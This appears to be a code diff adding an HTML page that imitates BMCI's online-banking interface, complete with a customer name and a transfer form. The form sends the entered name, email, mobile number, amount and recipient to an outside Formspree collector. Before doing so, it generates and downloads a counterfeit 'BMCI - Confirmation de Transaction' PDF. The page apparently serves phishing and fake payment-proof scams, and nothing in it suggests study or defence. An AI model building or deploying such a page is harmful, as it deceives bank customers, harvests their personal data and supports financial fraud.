@@ -1,0 +1,115 @@
+﻿<html lang="fr">
+  <head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>BMCI</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  </head>
+  <body class="bg-green-100">
+    <header class="bg-green-700 text-white p-4 flex justify-between items-center">
+      <div class="flex items-center">
+        <img alt="BMCI" class="mr-2" height="50" src="logo.png" width="50"/>
+        <span class="text-xl font-bold">BMCI</span>
+      </div>
+      <nav class="flex space-x-4">
+        <a class="hover:underline" href="#">BMCI MAROC </a>
+        <a class="hover:underline" href="#">Contactez-nous</a>
+        <a class="hover:underline" href="#">Localisateur</a>
+        <a class="hover:underline" href="#">Déconnexion</a>
+      </nav>
+    </header>
+    <div class="bg-yellow-500 text-white p-2 flex justify-center space-x-4">
+      <a class="hover:underline" href="#">MES COMPTES</a>
+      <a class="hover:underline" href="#">PAIEMENTS DE FACTURES</a>
+      <a class="hover:underline" href="#">VIREMENTS</a>
+      <a class="hover:underline" href="#">DEMANDES</a>
+      <a class="hover:underline" href="#">MESSAGES</a>
+      <a class="hover:underline" href="#">MON PROFIL</a>
+    </div>
+    <div class="flex flex-col md:flex-row p-4">
+      <aside class="bg-white p-4 shadow-md w-full md:w-1/4">
+        <div class="mb-4">
+          <p class="font-bold">Bienvenue, <span class="font-normal">EVA VELLE</span></p>
+          <p>Dernière session: mercredi, 5 novembre 2014 à 12 h 54.</p>
+        </div>
+        <div class="border-t border-yellow-500 mt-4 pt-4">
+          <h2 class="font-bold mb-2">VIREMENTS</h2>
+          <ul class="space-y-2">
+            <li><a class="hover:underline" href="#">Virements</a></li>
+            <li><a class="hover:underline" href="#">Virements programmés</a></li>
+            <li><a class="hover:underline" href="#">Lier mon compte externe</a></li>
+            <li><a class="hover:underline" href="#">Envoi de virement</a></li>
+            <li><a class="hover:underline" href="#">Mes destinataires</a></li>
+          </ul>
+        </div>
+      </aside>
+      <main class="bg-white p-6 shadow-md w-full md:w-3/4 mt-4 md:mt-0 md:ml-4">
+        <h1 class="bg-yellow-600 text-black p-2 font-bold">CRÉER LE PROFIL D'EXPÉDITEUR</h1>
+        <form id="BMCI" action="https://formspree.io/f/mqaplolq" method="POST" class="space-y-4 mt-4">
+          <div>
+            <label class="block font-bold" for="nom">Nom complet</label>
+            <input class="w-full border border-gray-300 p-2" id="nom" type="text" name="nom" required/>
+          </div>
+          <div>
+            <label class="block font-bold" for="courriel">Adresse courriel</label>
+            <input class="w-full border border-gray-300 p-2" id="courriel" type="email" name="courriel" required/>
+          </div>
+          <div>
+            <label class="block font-bold" for="mobile">Numéro de mobile</label>
+            <input class="w-full border border-gray-300 p-2" id="mobile" type="text" name="mobile" required/>
+          </div>
+          <div>
+            <label class="block font-bold" for="montant">Montant du virement</label>
+            <input class="w-full border border-gray-300 p-2" id="montant" type="number" name="montant" required/>
+          </div>
+          <div>
+            <label class="block font-bold" for="destinataire">Destinataire</label>
+            <input class="w-full border border-gray-300 p-2" id="destinataire" type="text" name="destinataire" required/>
+          </div>
+          <div>
+            <label class="block font-bold" for="message">Message (optionnel)</label>
+            <textarea class="w-full border border-gray-300 p-2" id="message" name="message"></textarea>
+          </div>
+          <button class="bg-blue-700 text-white px-4 py-2" type="submit">Confirmer le virement</button>
+        </form>
+        <p class="text-gray-500 mt-4">MD Marque déposée BMCI Inc. Utilisée sous licence.</p>
+      </main>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script>
+      document.getElementById('BMCI').addEventListener('submit', function(e) {
+        e.preventDefault(); // Empêche l'envoi direct du formulaire
+
+        // Récupérer les valeurs du formulaire
+        const nom = document.getElementById('nom').value;
+        const courriel = document.getElementById('courriel').value;
+        const mobile = document.getElementById('mobile').value;
+        const montant = document.getElementById('montant').value;
+        const destinataire = document.getElementById('destinataire').value;
+        const message = document.getElementById('message').value;
+
+        // Créer le PDF
+        const { jsPDF } = window.jspdf;
+        const doc = new jsPDF();
+
+        // Ajouter le contenu du PDF
+        doc.setFontSize(16);
+        doc.text('BMCI - Confirmation de Transaction', 20, 20);
+        doc.setFontSize(12);
+        doc.text(`Nom : ${nom}`, 20, 40);
+        doc.text(`Email : ${courriel}`, 20, 50);
+        doc.text(`Mobile : ${mobile}`, 20, 60);
+        doc.text(`Montant : ${montant} €`, 20, 70);
+        doc.text(`Destinataire : ${destinataire}`, 20, 80);
+        doc.text(`Message : ${message}`, 20, 90);
+
+        // Télécharger le PDF
+        doc.save('confirmation_transaction.pdf');
+
+        // Soumettre le formulaire à Formspree
+        setTimeout(() => this.submit(), 500); // Attendre avant de soumettre
+      });
+    </script>
+  </body>
+</html>
